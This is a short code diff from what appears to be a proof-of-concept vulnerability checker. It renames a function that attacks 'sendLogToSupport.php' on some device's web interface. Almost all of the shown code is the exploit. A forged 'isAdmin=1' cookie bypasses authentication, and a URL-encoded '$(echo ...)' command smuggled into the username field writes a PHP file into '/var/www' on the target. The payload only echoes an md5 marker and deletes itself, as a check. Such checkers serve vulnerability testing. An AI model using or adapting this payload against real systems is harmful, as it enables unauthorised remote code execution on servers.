@@ -19,7 +19,7 @@ def randomLowercase(n):
 		key+=zf[suiji1]
 	return key
 r2=randomLowercase(6)
-def scan(baseurl):
+def doCheck(baseurl):
 	url=baseurl+"web/php/sendLogToSupport.php?cmd=send_log&dev=a"
 	headers={'Cookie': "isAdmin=1; username=%24(echo%20'%3C%3Fphp%20echo%20md5(%22"+r1+"%22)%3Bunlink(__FILE__)%3B%3F%3E'%20%3E%20%2Fvar%2Fwww%2F"+r2+".php)%22%20-s%201337%20-c%20%22"}
 	response=requests.get(url,headers=headers,timeout=5,verify=False)
